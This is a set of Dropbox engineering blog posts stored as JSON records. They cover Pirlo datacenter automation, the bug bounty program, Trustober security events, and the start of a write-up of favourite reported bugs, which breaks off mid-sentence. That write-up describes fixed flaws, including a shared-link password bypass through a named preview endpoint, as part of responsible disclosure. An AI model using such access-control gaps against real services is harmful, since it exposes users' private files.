{"website": "Dropbox", "title": "Automating Datacenter Operations at Dropbox", "author": ["Reza Ahmad"], "link": "https://dropbox.tech/infrastructure/automating-datacenter-operations-at-dropbox", "abstract": "Introduction ClusterOps queue Switch provisioning Server provisioning, repair and validation Results Conclusion We’re hiring! Acknowledgments Introduction As a company that manages our own infrastructure we need to be able to rapidly install new server capacity and ensure that the equipment entering our production environment is highly reliable. Prior to the creation and implementation of the Pirlo system, engineering personnel at Dropbox manually intervened in most aspects of server/switch provisioning and validation. Pirlo was designed to eliminate and automate many of these manual processes. In this post we will describe Pirlo, a flexible system designed to validate and configure network switches and to ensure the reliability of servers before they enter production. We will explain the design of Pirlo and its components, and show how some of the design choices we have made enable Dropbox to manage our physical infrastructure operations efficiently and safely. Installing new server capacity can be broken down into two major stages: (1) network switch provisioning/validation and (2) server validation. The Pirlo system automates these tasks through the TOR Starter and Server Validation components that feed our ClusterOps queue. The following sections of this blog post will break down each component in detail, and at the end we will summarize some of the impact that Pirlo has had on our operational efficiency. Throughout this article, you’ll see references to users and workers. Here, users are people and workers are technologies. ClusterOps queue At a high level, Pirlo consists of a distributed MySQL-backed job queue built in-house using many of the primitives available in Dropbox production such as gRPC, service discovery, and our managed MySQL clusters. While there are some excellent job queue systems such as Celery , we didn’t need the whole feature set, nor the complexity of a third-party tool. Leveraging in-house primitives gave us more flexibility in the design and allows us to both develop and operate the Pirlo service with a very small group of SREs. The ClusterOps queue was designed to be as generic as possible while providing flexibility to the different services implementing the queue. The queue provides a service with: A basic Job table. A Database utility using the SQLAlchemy toolkit. A Queue Manager thread interface. A Worker thread interface. Switch provisioning Switch provisioning at Dropbox is handled by a Pirlo component called the TOR Starter. The TOR Starter is responsible for validating and configuring switches in our datacenter server racks, PoP server racks, and at the different layers of our datacenter fabric that connect racks in the same facility together. ClusterOps queue implementation Writing the TOR Starter on top of the ClusterOps queue provides us with a basic manager-worker queuing service. We also have the ability to customize the queue to fit our needs in switch provisioning. The switch job table (shown below) is an extension of the basic job table. Similarly, the TOR Starter queue manager thread implementation is customized to queue switch jobs, and the TOR Starter worker implements all of the switch validation and provisioning logic. Design Along with all of the switch job attributes, there are several tables that provide a comprehensive view of a switch job. As a switch job is running, the current state can be queried by a client and displayed in our user interface. After a switch job has completed, all of the job’s state is kept in the database and can be queried for reporting and analytics purposes. Tables in the database also hold information related to each component in the switch such as its network uplinks, fans, and power supplies. All of the captured data from a switch is linked to a particular switch job. Switch provisioning process The switch provisioning process begins once a user or switch discovery service creates a switch job via the TOR Starter client. The client makes a gRPC request using service discovery to find a healthy TOR Starter server. The switch is then verified for its eligibility to be provisioned and the switch job is placed into the work queue. The queue manager determines which switch job to process from the job queue in first-in first-out order. Once a job has been selected, the queue manager assigns an appropriate job handler based on the job type. A job type is an enumerated identifier that allows us to map specific modules (job handlers) used in a switch job workflow. These modules provide the worker with all the instructions and tasks required to provision a switch. Once the job handler has been determined, the worker performs all the tasks and checks required to provision a switch and moves the job through various phases. Life cycle of a switch job The prerequisite to validating and configuring a switch is out-of-band connectivity. This is made possible by a series of out-of-band devices which are pre-installed during the network-core build phase of a network cluster. Once out-of-band connectivity to a switch has been confirmed, there are a series of checks that the switch must pass before we determine that the switch is production ready. We have developed a plugin system which allows us to separate out the code that we run on the switch. Each plugin automatically sets a particular phase on the switch job when it starts running. As the switch job runs, each plugin transitions through each enumerated phase and the database is updated. Each plugin can throw enumerated failure codes that provide the operator with an idea about what failed. The failure codes can also be used for auto-remediation. Each plugin also logs events into the database, which are automatically associated with the switch job. A few of the initial plugins that we execute during switch provisioning are described below: Plugin (short description) Job Phase Possible Failure Code Can we establish out of band connectivity? OOB_CONNECT OOB_CONNECT_FAIL Are all power supplies present with power input? PSU_CHECK PSU_FAILURE Are all system and psu fans present? FAN_CHECK SYSTEM_FAN_FAILURE Does the serial number exist in our asset database? ADB_CHECK ADB_FAILURE Do the expected number of uplinks exist? LINK_CHECK UPLINKS_COUNT Are the uplinks upstream interfaces correct? LINK_CHECK UPLINKS_ORDER Are the light levels of the uplinks correct? LIGHT_CHECK LIGHT_LEVEL_FAIL Can each uplink establish connectivity? CONNECTIVITY_CHECK CONNECTIVITY_FAIL After the initial plugins have completed successfully, and we have determined that each uplink on the switch is able to establish network connectivity, we ensure the switch has the expected firmware installed. Firmware upgrades (or downgrades) are handled by a separate firmware plugin. Firmware is downloaded onto the switch by setting up a basic static route and downloading an image from a server in production. Using the network database and configuration tool developed by our Network Reliability Engineering (NRE) team, the TOR Starter will request a config for the switch that gets copied onto the switch. Once the config has been loaded into memory, another plugin performs some final checks to ensure that all routing protocols are working as expected. At the end of switch provisioning a final plugin reboots the switch and validates that it boots up with the correct configuration. During each phase, the TOR Starter captures the commands that are run on the switch along with the output. In the database, these are known as log events. We execute slightly different commands based on the type of switch and its role, but we keep the phases and failure codes generic across switch platforms. Most of the switch command output is parsed and we assign the failure codes based on specific output from the switch. When a switch job fails, the error is clearly indicated by the failure code. We can use the collected logs for further diagnosis. If a hardware component failure is detected, the corresponding table in the database is updated to reflect the component status as failed. User interface Along with the command line clients, Pirlo also has a user interface. The UI for the TOR Starter component provides the user with a holistic view of a switch job. For each switch job, captured data is visualized and shown along with a running list of the switch job events. From the UI a user can watch a switch job in near real-time as the worker is executing each plugin and transitioning through the phases of a job. Shown below is the UI for a successfully completed switch job. When a switch job fails, we try to show the failure if we can. In the example shown below, the failure code was a PSU_FAILURE and the issue was with Power Supply 1 which is marked in red. Server provisioning, repair and validation Server provisioning and repair validation at Dropbox is handled by a component called Pirlo Server Validation. All new servers arriving at our Dropbox data centers will initially go through Pirlo as the first step of validation. Similarly, repaired servers are validated before they transition back into production. ClusterOps queue implementation Similar to the switch provisioning service, we are able to take advantage of the ClusterOps queue and customize it for server validation. The server job table (shown below) is an extension of the job table. The server validate queue manager thread implementation is customized to queue server jobs, and the server validate worker implements all of the validation logic for servers. Hotdog The operating system image we use for server validation is created with a tool called Debirf . The image below shows a minimal Ubuntu with the addition of vendor tooling (RAID, Bios, BMC), benchmarking and stress tools, a s well as Dropbox code that interacts with Pirlo to check inventory, run applications to stress the system, and record benchmark results. Hotdog is a PXE booted RAM disk OS image which has the advantage of running everything out of main memory so we don’t need to rely on a functioning storage subsystem for our workflows . Once the image has been booted over the network, startup scripts rsync additional tooling that can be updated independently of the image. While the main use case for Hotdog is Pirlo automation, a user can also boot a host into Hotdog manually and log in interactively to perform ad-hoc debugging tasks on very problematic systems. Design The server job attributes, along with other tables provide a comprehensive state of a server job. As a server job is running, the current state can be queried by a client and displayed in our user interface. After a server job has completed, all of the server job state is kept in the database and can be queried for reporting and analytics purposes. Tables in the database also hold event data, such as logs and structured text. Additionally, server component benchmark results are stored in the database and are used for statistical analysis to detect outliers. In the server job table we also store a link to the server in our asset database, and a snapshot of all server inventory is sent to our asset database every time a server job runs. Life cycle of a server job One prerequisite for validating a server is that the server be able to boot into Hotdog. Once the server boots into Hotdog there are a series of plugins that must run successfully before we determine that the server is production ready. This is exactly the same flow that the TOR Starter uses to validate and configure a switch and most of the concepts remain the same. A server job is made up of a series of plugins that run in a stated order as determined by a specific job handler that maps directly to a job type. Using job types, we can have many different types of server validation jobs that execute the different plugins in any order. As with switch jobs, server jobs have enumerated phases and failure codes that are set by each plugin. Plugins can also log data that is stored in the database. The validation job handler is used to determine production worthiness and runs a comprehensive series of plugins that cover component inventory verification, benchmarking, and stress testing the server. Other job handlers have been created to only run a few of these tasks. Server jobs can be created by a user or via automation, depending on the job type. Server jobs can be one of following job types: Provision or Validation . Provision job Some server jobs are created by an automation hook the very first time servers land at our data centers. Upon completion of a successful switch provision job, server provision jobs are created for all servers in the corresponding rack. Provision jobs configure and perform validations along with long burn-in tests that create a realistic, high-load situation in order to test various hardware components. Validation job Server validation jobs provide a comprehensive suite of tests, updates, and BOM validations for machines transitioning out of repair. A transition out of repair indicates the Datacenter Operations team has finished replacing the defective hardware component(s) and they consider the server to be repaired. Pirlo validation jobs are created automatically once the Datacenter team has moved a server status from repair to repaired. A Pirlo validation job ensures the repair action was successful and begins transitioning the server back into our production environment. Below are some of the initial plugins that are executed when validating a server. This early process ensures that a host is at least healthy enough to boot, and it sets up the server with dependencies required by the more sophisticated plugins. If any of these early plugins fail, we log as much data as we can from out-of-band interfaces to help the user determine why the server can’t boot. Plugin (short description) Job Phase Possible Failure Code Does the bmc interface ping? IPMI_PING IPMI_PING_FAIL Can we obtain power status via bmc? IPMI_POWER IPMI_POWER_FAIL Are we able to pxe boot the machine? SET_PXE_BOOT SET_PXE_BOOT_FAIL Did the machine boot the Hotdog image? HOTDOG_CHECK HOTDOG_FAIL Are we able to establish a ssh session? VERIFY_SSH SSH_FAIL The worker plugins execute all commands on the server via SSH. By design, the server runs no Dropbox daemons or service discovery; thus it can not independently send any data back to the worker. There is a generic framework that any plugin can use for long-running commands. It polls a status file on the server to determine whether a process has timed out/crashed. While polling is not ideal, we poll very infrequently and it hasn’t been a scalability concern. Bill of materials (BOM) verification We maintain a detailed set of server bill of materials (BOM) that describe all the possible combinations of components we can use in each of our server classes. This allows us to regulate the allowed make and model of every server component in the fleet. The database also has a list of valid component configurations for each hardware class, allowing us to gate the different combinations that are permitted. An example of a whitelisted memory config: Copy CPU1:\n    DIMM_1: [HMA42GR7MFR4N-TF, M393A2G40DB0-CPB]\n    DIMM_3: [HMA42GR7MFR4N-TF, M393A2G40DB0-CPB]\nCPU2:\n    DIMM_1: [HMA42GR7MFR4N-TF, M393A2G40DB0-CPB]\n    DIMM_3: [HMA42GR7MFR4N-TF, M393A2G40DB0-CPB] We verify the BOM against this list of server components: Root and Storage Disks Memory Modules CPUs RAID Controllers Network Cards The two main benefits of BOM verification: Consistency and safety in server component swaps. The wrong component can not be swapped into a machine and pass validation. Ensuring replacement components we receive from our vendors have been qualified by our Hardware Engineering team and are permissible for production. Firmware verification For each server component such as RAID controller, BMC, BIOS, and Network card, the Hardware Engineering team has qualified specific firmware versions. A plugin upgrades (or downgrades) all components to their desired firmware revisions by executing a tool supplied by the Hardware team that bundles all vendor firmware images and desired BIOS settings. Stressing and benchmarking One of the major functions in server validation is the ability to stress and benchmark components. Stressing components such as memory, cpu, and disk allows us to actually cause issues that we may not see during idle operation. The most interesting server failure cases often involve server components that are not completely failed, but which fail when they are stress tested in our isolated environment. Some of the stress testing utilities are listed below: Component Utility Description Memory Stressapptest Maximized randomized traffic to memory CPU Stressapptest, mprime Exercises CPU with artificial load @ 100% Disk FIO Stresses disk while verifying data integrity Benchmarking new or failed components against a known baseline also allows us to verify desired functionality and proper configuration of servers. Servers that fail to meet thresholds indicate that something is misconfigured, faulty, or has some other unknown issue. We want to make sure underperforming or broken servers do not make it into production. Some of the benchmarking utilities are listed below: Component Benchmark Description Memory RAMSpeed Measures the cache and memory performance of the CPU/Ram. CPU OpenSSL Measures how fast the CPU can calculate cryptographic hashes. Disk FIO Measures disk I/O - read and write speeds. A series of plugins execute different stress testing and benchmarking tests based on the class of server being tested and the components within the server. New plugins can be added very easily when we want to add a new test. Each stress test or benchmark plugin can log data as events, and can also store structured data in the special benchmark results table. We can do reporting on the benchmarks table for all server jobs to see how each individual server performs against other similar servers. This helps us to refine our thresholds for failure and easily discover anomalies. Final steps As with switches, we only consider servers to be validated once they successfully execute all plugins for a job type. At the end of validation, we automatically move the server back into production to get re-imaged by our operation system installer. If a server is in repair, we transition the status of a repair ticket in our ticketing system and we add a small summary of the server job with a direct link to the UI as a comment in the ticket. User interface The Pirlo UI component for server validation is shown below. Similar to switch jobs, each server job contains a table with a log of all phases and you can watch the worker execute a live server job in real-time. As with switch jobs, all finished server jobs can be accessed and viewed in their final state. Some structured log data for components such as disks are shown as tables: Failures such as disk benchmark failures (mentioned above) are clearly indicated in the UI: Raw benchmark data is also available in the UI: Results Pirlo was designed to automate or eliminate manual processes. Like any business case that looks to automate a previously manual process, the team hypothesized that the creation of Pirlo would primarily: Reduce Errors, Downtime, and Associated Rework: Limit downtime, outages, and inefficiencies associated with incomplete or erroneous provisioning or triage. Increase Operational Efficiency: Reduce human intervention time, acting as a force multiplier for operations engineers. Previously, server provisioning and validation required an operations engineer to use playbooks and subject matter expertise in tandem with various server error logs to prescribe a series of remediation or configuration actions for the to-be-provisioned or failed hardware. Following the remediation actions, the engineer would release the machine back into production by sending the server to our re-imaging system. If the remediation actions didn’t cure or properly prepare the server for re-imaging, the server would be sent back to the operations engineer for additional triage. These manual operations consumed a significant portion of our operations engineers’ time and resources and also caused a lot of churn with the server re-imaging system. We hypothesized that by … Holistically health-checking (inclusive of BOM validation, component health and benchmark/stress testing) and providing diagnostics for a server Applying firmware patches for hardware subcomponents while in the pit-stop Gating release of machines into the re-imaging system on a clean bill of health Pirlo would: Reduce the amount of server failure recidivism, enabling operations engineers to increase their task load with the assurance of releasing holistically healthier machines back into production. Since the internal beta release of Pirlo, the hypothesis seems to be validated. To properly evaluate this, let’s break this down into two sections: the first being the server recidivism, and the second being the output efficiency of operations engineers. Prior to the advent of Pirlo, any server that did not obtain a first-pass success, incurred server failure recidivism . Operations engineers manually managed diagnoses, validations, and remediations. When re-imaging a candidate server failed, or service errors were discovered after re-imaging, the server would be sent back to the operations engineer for triage. This process would repeat until the candidate server successfully provisioned. We thought Pirlo would increase first-pass success by checking for many of the common hardware failures that occur during and immediately after re-imaging. Over time, Pirlo saw continuous improvement by the development team: incorporation of newly discovered systemic issues, software updates, and benchmark/diagnostic suites. The table below summarizes the first-pass success rate for systems released to production since January of 2018 following the beta release of Pirlo: First-Pass Success Rate (%) January 84.4 February 82.8 March 93.7 April 92.9 May 87.1 June 91.0 July 93.7 August 91.7 September 95.5 October 96.5 With the advent of rapid adoption and continuous improvement of the Pirlo system, first-pass success increased by 12.2%. This should have meant that operations engineers would be empowered to use their newfound time to work on repairing and validating other servers (a force multiplier effect). In fact, they did. Operations engineers steadily increased their output by 40+% in that same period of time. While first-pass success for released servers reduced the amount of servers competing for an engineer’s attention, it also reduced the amount of babysitting (waiting for a server to pass re-imaging). Rather than having engineers manually running tests using playbooks, Pirlo performed an automated sequential battery of tests that reduced the need for hands-on attention and concurrently increased diagnostic accuracy. The decreased time-to-remediation allowed engineers to address more issues in the same amount of time. The following table displays issues remediated per engineer per working day over the same time period as the First-Pass Success Rate table above: Average Workday Remediations per Operations Engineer January 7.77 February 6.48 March 9.91 April 10.79 May 11.42 June 11.95 July 10.14 August 12.76 September 11.82 October 10.96 During this time, the size of the server fleet within the internal Dropbox cloud increased by more than 15%. At the same time, the average percentage of machines in a non-functional or state-requiring-repair remained below 0.5% . Finally, during this time period, the headcount of Operations Engineers remained the same . The advent of Pirlo in combination with a pursuit of best practices and operational excellence permitted the operations teams at Dropbox to act with a force multiplier. Conclusion The Pirlo system allows Dropbox to safely and efficiently perform our physical operations: including new rack provisioning and server repairs. Pirlo and its subcomponents for switches and servers are always evolving and improving. Throughout 2018 we had tens of thousands of server and switch jobs and we caught severe issues with servers and switches that would have caused reliability issues in production. We now have a large corpus of stored log data that we can use for further evolution and our goal is to keep improving Pirlo and its subcomponents. We’re hiring! Dropbox is hiring for a variety of positions across infrastructure. Please visit our jobs website for specifics. The Cluster Operations team is hiring SREs to build tools and workflows that improve safety and efficiency in monitoring, operating, and expanding Dropbox’s Physical Infrastructure. Acknowledgments Pirlo was developed by Cluster Operations team members: Reza Ahmad, Matt Cote, David Fiedler, and Bryan Seitz. We would also like to thank our partner teams in Infrastructure that have contributed code and provided valuable feedback: Datacenter Operations, Network Engineering, Network Reliability Engineering and Hardware Engineering. // Tags Infrastructure Hardware Performance Operations // Copy link Link copied Link copied", "date": "2019-01-16"},
{"website": "Dropbox", "title": "Introducing the Dropbox bug bounty program", "author": ["Devdattaakhawe"], "link": "https://dropbox.tech/security/introducing-the-dropbox-bug-bounty-program", "abstract": "Protecting the privacy and security of our users’ information is a top priority for us at Dropbox. In addition to hiring world class experts, we believe it’s important to get all the help we can from the security research community, too. That’s why we’re excited to announce that starting today, we’ll be recognizing security researchers for their effort through a bug bounty program with HackerOne . Bug bounties (or vulnerability rewards programs) are used by many leading companies to improve the security of their products. These programs provide an incentive for researchers to responsibly disclose software bugs, centralize reporting streams, and ultimately allow security teams to leverage the external community to help keep users safe (something I’ve advocated for in previous research ). While we work with professional firms for pentesting engagements and do our own testing in-house, the independent scrutiny of our applications has been an invaluable resource for our team — allowing our team to tap into the expertise of the broader security community. We’ve recognized the contributions of the researchers we’ve worked with in a public hall of fame , and now we’re very excited to be one of several companies that provide monetary rewards, too. In fact, we’ll be retroactively rewarding researchers who’ve reported critical bugs in our applications through our existing program, paying out $10475 today. Here are some additional details about the program: What is the minimum and maximum bounty? We do not have an official maximum bounty. The minimum bounty for qualifying bugs is $216 and the maximum bounty that we have paid out till now is $4913. What if I report a duplicate vulnerability? We will reward the first report. What applications are in scope for this bounty? For now, the Dropbox, Carousel, and Mailbox iOS and Android applications; the Dropbox and Carousel web applications; the Dropbox desktop client as well as the Dropbox Core SDK are eligible for the bounty program. We may also reward for novel or particularly interesting bugs in other Dropbox applications. Are there other rules? You can find more details about the rewards program on our HackerOne page . This is another step in our commitment to security and privacy, which has already been reflected in the recognition and ranking by external organizations like EFF and SSLLabs , as well as our participation and support of organizations like SimplySecure . We look forward to working with security researchers and awarding them for their contributions to the security of all Dropbox users. // Tags Security Bug Bounty Program // Copy link Link copied Link copied", "date": "2015-04-15"},
{"website": "Dropbox", "title": "Updates on the Dropbox Bug Bounty Program", "author": ["Devdattaakhawe"], "link": "https://dropbox.tech/security/updates-on-the-dropbox-bug-bounty-program", "abstract": "Tripling bounties Special Bonus for Great Research Matching donations We first launched our bug bounty program in 2014, with initial bounties for critical bugs in the range of $5,000, ramping up to (currently) over $10,000 for critical bugs. Over the past three years, leading security researchers from around the world have participated in our programs with some amazing, often original research. Beyond just the individual bugs, we have learned many a lesson, uncovering unique, interesting threats, exploit vectors, and new research as well as rejigged our priorities based on the bug bounty reports. From Dropbox and all our users, a big THANK YOU to all the researchers that help secure Dropbox for our users! Today, we’re excited to announce a number of improvements to the program, as well as highlight the progress we’ve made internally, in terms of both response and fix times. We know that researchers value quick response and rewards. We recently measured our response times since 2014 and learned that 75% of our responses were within 2 days and 2 hours, with the quickest response being around 50 minutes. We have been working hard to improve our responsiveness and our reward latency even more. Over the last 12 months, we’ve drastically reduced our 75th percentile response time to under 16 hours of the report. For high-quality reports, we usually reward as soon as we reproduce the bug. In fact, we have sometimes paid out within minutes of receipt of a bug. Fastest triage payout tweet Fast triage payout acknowledgement Through the bug bounty program, we have found a pool of incredible researchers who consistently do high-quality work. To further encourage such research, we’ve invited these researchers to a VIP program where we provide early access to upcoming features. Since the start of this program, 75% of our VIP reports got responses within 16 hours, and over the last year, we have reduced this time to 9 hours. Talking to the community, we also know that hackers really value quick resolution of reported bugs. We typically aim to resolve high and critical bugs as soon as possible. We have resolved some bugs in under an hour of the report; for reports with bounties of more than $1,000, we resolved (fixed and out to the world) more than half of them in under 16 days. Fast bugfix response acknowledgement from Frans Rosen Dropbox users trust us with some of their most sensitive data, and we work ceaselessly to provide the best possible security for our users. Security researchers participating in our bug bounty program are a critical partner in this effort, and we are excited to announce three new updates to our program. Tripling bounties Starting right now, we are delighted to announce that we are more than tripling our bounties, with the reward for critical bugs — for example, bugs that could lead to remote code execution (RCE) on our servers — now topping out at $32,768 and bounties for RCE affecting our desktop/mobile clients at $18,564. To help kickstart this, we have also topped up any critical reports in the last 6 months with the equivalent increased bounty, paying out an additional bounty of over $28,000 for high/critical bugs reported this year. Special Bonus for Great Research Additionally, we have instituted a process to review particularly novel, high-quality research submitted to our program. At least twice a year, Dropboxers will go through high-quality submissions and award bonuses. Typical factors going into a decision include quality of report/research, interaction with researcher, and so on. With these bonuses, we also aim to encourage novel research. We just went through submissions this year and awarded an additional $14,000 in bonuses. Here are some examples of interesting bugs that we rewarded: Neex reported a local file disclosure vulnerability via ffmpeg HLS processing. While the impact on Dropbox was minimal since we sandbox all our video processing, we were impressed with the quality of research in the submitted vector: A video file that reads file contents is a pretty advanced vector. Mdv reported an XSS in the outbound chat vendor we use on our marketing pages. While the XSS was on the vendor’s domain, we pay based on impact, not based on whose fault it is. Mdv’s report was of a very high quality and thoughtfully explained how the XSS could impact our customers’ security. Frans reported a mailgun misconfiguration on email.gateway.dropbox.com . We fixed the bug within half an hour of the report. Since this is an unused domain, the impact was low. But, we loved the quality of the report, the clear description of the impact, and identifying issues in integrations is pretty innovative. Matching donations We have also started matching bounty donations to charity made through HackerOne. We recently matched a donation to Doctors Without Borders and look forward to supporting many a good cause with this matching. Dropbox loves partnering with the security researchers to protect our users. Thank you to all the researchers who help make Dropbox secure for everyone! Devdatta Akhawe manages the bug bounty program at Dropbox on top of his day job as engineering manager of the Product Safety team. If you’re a security researcher interested in participating in our bug bounty program, please contact us on HackerOne . We are also hiring . // Tags Security Bug Bounty Program // Copy link Link copied Link copied", "date": "2017-09-20"},
{"website": "Dropbox", "title": "Security culture, the Dropbox way", "author": ["Jessica Chang"], "link": "https://dropbox.tech/security/security-culture--the-dropbox-way", "abstract": "What is Trustober? Sparking curiosity in security Making a difference Next steps The Dropbox Security Team is responsible for securing around 1 exabyte of data, belonging to over half a billion registered users across the world. The responsibility for securing data at this scale extends far beyond the Dropbox Security Team—it takes a commitment from everyone at Dropbox to safeguard our users’ data every day. In other words, it takes a strong security culture. The first core company value at Dropbox is “Be Worthy of Trust.” From a security perspective, this means keeping our users’ stuff safe. Our culture of security is built on this foundation of trust and is a fundamental part of our identity. We have a dedicated Security Culture Team whose mission is to cultivate an environment where our employees make consistently secure and informed decisions that protect Dropbox, our users, our employees, and our physical spaces. To build their security cultures, companies have adopted approaches ranging from gamification to mandatory security trainings. At Dropbox, we do those things and more. Each year, the Security Team throws one of the largest companywide events at Dropbox, called Trustober, held during National Cyber Security Awareness Month in October. And yes, you read that right—the Security Team throws one of our biggest bashes! What is Trustober? While nurturing a security culture is a year-round job, Trustober brings Dropbox employees together to learn more about ways we protect Dropbox, our users, and one another. It’s a month that helps us celebrate a culture of security both in the workplace and outside the office. During Trustober 2017, the Dropbox Security Team designed and held over 30 security programs globally. These ranged from short talks and Q&As to daylong workshops on topics related to security, safety, and trust, including: Tailgating Social engineering Phishing Threat modeling Account security First aid and CPR training Bug bounty programs Business continuity practices Secure coding practices Two-factor authentication Password hygiene and password managers The majority of our talks and workshops are created in-house with a strong team of volunteers, and are shared across our offices globally. We’ve also been lucky to have friends from the security community, including Adam Shostack, David Molnar, Charlie Reis, Brad Hill, and Frans Rosén, share their stories and research with our employees. Sparking curiosity in security One way we do things differently at Dropbox is by creating immersive experiences that make security and safety top of mind for our employees. Our goal is to spark curiosity and a security-first mindset in our employees through creative, fun, and engaging programs. For instance, while social engineering is a familiar concept, Verizon’s 2018 Data Breach Investigations Report found that over 90% of data breaches have a phishing or social engineering aspect to them. During Trustober, a number of Dropbox employees volunteered for a daylong social engineering workshop designed and led by internal experts that immersed them in a hypothetical scenario involving a malicious insider. Participants conducted an investigation together in a fast-paced and collaborative exercise that took them out of their daily roles and routines. When asked for feedback, one employee shared: “Social engineering is everywhere and anyone can be a target or a social engineer… it was very eye opening (and a ton of fun!) to see how it’s done in real life instead of a Hollywood movie .” At Dropbox, we’ve worked to build a positive culture around reporting potential phishing emails by encouraging employees to report anything suspicious, running regular test campaigns, and holding fun workshops. During Trustober, we ran a hands-on workshop where Dropbox employees researched, crafted, and presented their own phishing schemes. By teaching them how to build targeting phishing schemes, our goal was for employees to understand what makes a phishing email look legitimate. We’ve also partnered with speakers such as Dr. Mark Baldwin, an international expert on the Enigma Machine, to bring immersive workshops on security-related topics to Dropbox. These experiences provide a deep dive into security from multiple angles. Dr. Baldwin, nicknamed “Dr. Enigma,” illustrated how human error, procedural flaws, and leaks of key information enabled the Bletchley Park team and others to crack the Enigma machine’s ciphers, despite its technical sophistication. Not only did Dr. Enigma’s talk illustrate how an organization can only be as secure as the people who are operating or taking care of it, but it also provided our employees with a historical and hands-on opportunity to understand the importance of their personal responsibility in keeping Dropbox and our users secure. A highlight of Trustober is our annual Capture the Flag (CTF), a competition which provides employees with a fun, hands-on opportunity to solve security-related puzzles. By teaching employees how to recognize potential security flaws, we get our employees excited about security and help them practice their offensive thinking. At Dropbox we design and run our CTF internally, a herculean effort which you’ll hear more about in this series of blog posts. In 2017 over 200 employees participated in the CTF, which focused on topics ranging from disk forensics to writing XSS payloads that bypass CSP. After the CTF, this was our favorite survey response: Survey results An event like Trustober also gives Dropbox an opportunity to celebrate our culture of safety by providing our employees with opportunities to learn about their physical safety, both within the workplace and at home. In 2017 we ran a number of First Aid and CPR certification workshops in partnership with the American Red Cross and the Irish Heart Foundation. Over 200 employees signed up for the voluntary workshops, and received certifications for first-aid and CPR from these organizations for successfully completing the courses. Our newly-certified Dropbox employees now help support their workplace with a high level of emergency preparedness. Making a difference How do we know our efforts with security culture are making a difference? We look at the overall impact we’re driving, including conversations on internal company channels, attendance at events, and questions posed to our team, and solicit feedback from our employees. One way to observe engagement is by seeing internal discussions on company channels around badging, tailgating, and security challenges within a CTF. These may be difficult to measure but indicate we’re sparking security-oriented thinking within our company. Our events range from small, curious crowds to audiences of over 100, and it’s important to note the challenge of encouraging attendance amidst all other commitments employees have. Another way to analyze engagement is to survey your employees directly. Over 90% of Dropbox employees who responded to our survey found the content of Trustober helpful for security and safety in their role and workplace, including the following responses: “I found all the sessions I attended very interesting and educational. It’s amazing how much we take security for granted at Dropbox and how important it is continue to be vigilant, because the bad guys are always learning too!” “Security and trust is something that affects every [employee] and it’s for each of us to own it.” The scale of running something like Trustober is important to highlight, particularly if you’re interested in creating a similar event. Launching and running Trustober 2017 took 130 employees who volunteered across nearly a dozen Dropbox offices, and required close coordination and communication throughout. However, we’ve now created dozens of hours of security knowledge and resources in the talks, workshops, and programs that will help Dropbox employees continue to learn as we grow. Next steps Looking to start a security culture program at your company? Get started by diving into your current state of security behaviors, identifying where you’d like to move the needle, and defining your goals. It’s important to build your approach with your company’s culture in mind, and partner closely with those who can help you. When it comes to getting support, we recommend sharing the program and its goals broadly with your employees. Overall, it takes a significant amount of resources, skills, and support to build a transformative program that focuses on culture beyond awareness. The good news is that we’re in this together. As one of our employees put it best in their feedback on the state of security, “Holy crap, it’s crazy out there!” Whether you’re a security professional or simply curious, we encourage you to share your ideas, feedback, and questions to find ways to help us all stay secure. // Tags Security Ctf Trustober Security Culture // Copy link Link copied Link copied", "date": "2018-06-01"},
{"website": "Dropbox", "title": "Dropbox bug bounty program has paid out over $1,000,000", "author": ["Dropbox Product Security Team"], "link": "https://dropbox.tech/security/dropbox-bug-bounty-program-has-paid-out-over--1-000-000", "abstract": "Top 5 Favorite Bugs Reported Over the past five years, our bug bounty program has become an important part of improving our security posture, as it is now for many large tech companies. Transparency and defending the rights of legitimate researchers are cornerstones of the progress we’ve made, and the world is safer for it. To those outside of the security community, it may seem counterintuitive that you can make your platform safer by encouraging security researchers to attack you, but that’s exactly the value that these programs deliver. This process of discovering and remediating bugs is key to our maintaining a highly secure organization and increasingly hardened product surfaces. Our bug bounty program is only part of having a complete secure development lifecycle program. Our bug bounty program recently passed a significant milestone. Since launching our program in 2014 and tripling ou r bounties in 2017, we’ve given more than $1,000,000 to bug bounty participants for valid findings submitted to our program. Not only has Dropbox benefitted from our bug bounty program, but so have some of our most critical vendors who have remained active participants in our program. Together with our vendors, we have partnered up in two live hacking events including the HackerOne one-day bug bounty event in Singapore. Additionally, charities have also benefited from our continued investment in security through bug bounty reporters that have leveraged our donation matching policy to donate more than $10,000 to charities around the world. Top 5 Favorite Bugs Reported To help celebrate this momentous occasion, the Dropbox Production Security team wanted to disclose, in-depth, five of our favorite reports we’ve ever received. We feel these amazing findings by our top bug bounty hunters impressed us, taught us, and validated the work we do in raising the bar for security. 5. Shared Link Password Bypass HackerOne Report by detroitsmash Have you ever wanted to share a file via link but were afraid that anyone with the link would be able to access it? Dropbox Professional and Business customers are able to password protect their shared links via an option in Link Settings . This ensures that only users with the password for the link are able to access the file. One of our top bug bounty reporters, detroitsmash , reported on December 25, 2018 that one of our endpoints responsible for performing document previews in Paper documents was ignoring passwords set on shared links. This would allow an attacker with a copy of a password protected shared link to be able to bypass the password requirement and view the document. The endpoint works as follows: A user takes a share link for one of their documents and pastes it into Dropbox Paper. The Dropbox Paper client then sends this link to our servers via an endpoint /integrations/embed/fetch/matte?sharedLinkUrl=<shared link>. This endpoint then produces a preview image to be placed within the Paper document. After validating the report, it was discovered that additional access control checks were missing on this endpoint. We immediately got to work on correcting this and pushed a fix out within a day. detroitsmash was awarded $10,648 for their finding and was later awarded an additional $2,744 as a bonus for being one of the best reports we received within that 6-month period. 4. Paper Notification CSS Injection HackerOne Report by 0xacb and cache-money Last year, Dropbox started running live hacking events with HackerOne. Live hacking events take bug bounty to the real world. Top bug bounty reporters from around the globe get together, often in person, to find vulnerabilities in a company’s software. They allow bug bounty reporters to collaborate more easily and for security teams to build stronger relationships with the bug bounty reporters that help them secure their software every day. The most recent Dropbox live hacking event found many vulnerabilities, but one of our favorites from the event was found by 0xacb and cache-money in collaboration with our very own Product Security team. Following what was a small oversight in the name validation on one of our account registration endpoints, was a chain of little issues that resulted in the ability to remotely access another user’s Paper documents. Dropbox teams have access to a bulk user import feature that allows a Team Admin to import users listed in a CSV file. This feature is helpful for teams that have hundreds of licenses and the process of manually inviting each user one-by-one would be too cumbersome. 0xacb discovered that while our normal account signup at https://dropbox.com/register would ensure that users cannot use certain “illegal” characters (including < and >) in their first and last names, the account registration via CSV endpoint did not. While this is a bug, it wasn’t a security bug ; it didn’t really have any security impact because we usually sanitize everything client-side with React anyway. With the day of the event just around the corner, 0xacb joined forces with cache-money to see if they could figure out a way to escalate this weird behavior further. At one point, 